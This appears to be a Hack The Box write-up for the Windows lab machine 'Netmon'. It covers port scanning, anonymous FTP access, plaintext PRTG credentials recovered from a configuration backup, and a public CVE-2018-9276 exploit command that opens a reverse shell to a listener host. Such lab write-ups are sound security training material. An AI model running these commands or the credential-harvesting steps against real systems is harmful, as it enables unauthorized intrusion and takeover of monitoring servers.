---
title: "[EASY] HTB-Netmon"
draft: false
tags:
  - htb
  - windows
  - ftp
  - prtg
---
## Information Gathering

### Rustscan

Rustscan found several ports open but main ones seemed to be **FTP**,**HTTP**, and **SMB**.

```bash
┌──(yoon㉿kali)-[~/Documents/htb/netmon]
└─$ rustscan --addresses 10.10.10.152 --range 1-65535
.----. .-. .-. .----..---. .----. .---. .--. .-. .-.
| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
| .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy :
: https://github.com/RustScan/RustScan :
--------------------------------------
🌍HACK THE PLANET🌍

<snip>
Host is up, received syn-ack (0.30s latency).
Scanned at 2024-03-26 01:08:27 EDT for 1s

PORT STATE SERVICE REASON
21/tcp open ftp syn-ack
80/tcp open http syn-ack
135/tcp open msrpc syn-ack
139/tcp open netbios-ssn syn-ack
445/tcp open microsoft-ds syn-ack
5985/tcp open wsman syn-ack
47001/tcp open winrm syn-ack
49664/tcp open unknown syn-ack
49665/tcp open unknown syn-ack
49666/tcp open unknown syn-ack
49667/tcp open unknown syn-ack
49668/tcp open unknown syn-ack
49669/tcp open unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds
```

## Enumeration

### SMB - TCP 445

  

Null login was not allowed for SMB:

  

![](https://i.imgur.com/rQvXpPR.png)


  

crackmapexec revealed device name: **netmon**

  

![](https://i.imgur.com/5pKgAQD.png)


  

### HTTP - TCP 80

  

Webpage had a login page for **PRTG Network Monitor** which is used to monitor network traffic:

  

![](https://i.imgur.com/5eWOOBK.png)



  

#### Directory Bruteforce

  

Webpage was using **.htm** extension, so I ran feroxbuster with **htm** extension:

  

`sudo feroxbuster -u http://10.10.10.152 -n -x htm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

  
  

![](https://i.imgur.com/UwUn6KH.png)


  

I see some paths that leads to *.htm but nothing looked very intriguing at the moment.

  

#### Default Creds

  

Searching about **PRTG Network Monitor** for a bit, I found out it is vulnerable to Authenticated RCE.

  

![](https://i.imgur.com/QHK34TL.png)



  
  

As the default credentials are **prtgadmin**:**prtgadmin**, I tried it but it didn't work:

  

![](https://i.imgur.com/h4A7IvI.png)


Since PRTG Network Monitor is vulnerable to Authenticated RCE, I would have to discover valid credentials somewhere.

### FTP - TCP 21

  

Luckily, anonymous login was allowed on FPT:

  

![](https://i.imgur.com/x8t1fJq.png)


  

Listing the files, I realized I am inside root directory of the system:

  

![](https://i.imgur.com/JJCEY6O.png)


  

To my surprisce, I was able to obtain user.txt from **Users/Public/Desktop**:

  

![](https://i.imgur.com/mFDrnMS.png)



  

This must have been my fastest user.txt ever I believe...

  

## Getting Creds for prtgadmin

  

According to [this reddit post](https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/), passwords are exposed in plain text in backup:

  

```
Automatically generated backups under:

C:\ProgramData\Paessler\PRTG Network Monitor\Configuration Auto-Backups\

Automatically generated temporary files that may exist:  

C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old

C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.nul

If you run PRTG Network Monitor in cluster mode, please also remember to remove the configuration backups in the PRTG data path on every failover node.

Also remember that you may have additional copies of the PRTG Configuration.dat file for backup purposes. We recommend deleting all affected copies of this file.
```

  

Going to `/ProgramData/Paessler/PRTG Network Monitor`, I saw bunch of **PRTG Configuration** files:

  

![](https://i.imgur.com/h7gHJKJ.png)


  

Downloading and examining **PRTG Configuration.old.bak**, I obtained potential credentials: **prtgadmin:PrTg@dmin2018**

I tired logging-in to the system with the found credentials but it didn't work. 

However, changing **2018** to **2019** it let me in:

  

![](https://i.imgur.com/XDfJO4Q.png)


  

Now using the exploit found from [this github](https://github.com/A1vinSmith/CVE-2018-9276), I can get a shell as the system:

  

`python exploit.py -i 10.10.10.152 -p 80 --lhost 10.10.14.17 --lport 1337 --user prtgadmin --password PrTg@dmin2019`

  

![](https://i.imgur.com/xM9ndXs.png)


  

![](https://i.imgur.com/EqLylDc.png)
